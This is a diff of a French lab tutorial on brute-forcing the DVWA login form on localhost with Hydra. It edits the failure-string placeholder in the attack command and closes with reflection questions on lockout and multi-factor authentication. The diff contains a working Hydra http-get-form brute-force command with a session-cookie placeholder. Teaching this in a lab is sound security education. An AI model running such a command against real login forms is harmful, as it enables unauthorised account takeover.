@@ -190,7 +190,7 @@ La commande Hydra est extrêmement sensible. Une seule erreur et rien ne fonctio
 Lancer une attaque sur un formulaire web demande une syntaxe précise. Voici la commande à adapter avec **votre PHPSESSID** noté à l'étape 3 :
 
 ```bash
-hydra -l admin -P custom_pass.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=VOTRE_COOKIE; security=low"
+hydra -l admin -P custom_pass.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=UNE_PHRASE_OU_MOT_QUI_EXISTE_QUE_SUR_LA_PAGE_D_ECHEC:H=Cookie: PHPSESSID=VOTRE_COOKIE; security=low"
 ```
 
 **Si l'attaque réussit**, Hydra affichera le mot de passe trouvé en évidence.
@@ -307,4 +307,5 @@ Durée : 20 min
 5. **Vitesse et Verrouillage :** Hydra peut tester des centaines de mots de passe par seconde. Si le serveur ajoutait un délai de 2 secondes entre chaque tentative ou bloquait le compte après 5 échecs, l'attaque resterait-elle réaliste ?
 
 6. **L'ultime rempart :** Même si un attaquant possède un dictionnaire parfait et que le serveur est vulnérable, quelle technologie (souvent utilisée sur vos comptes personnels) rendrait la découverte du mot de passe totalement inutile pour l'attaquant ?
+
 
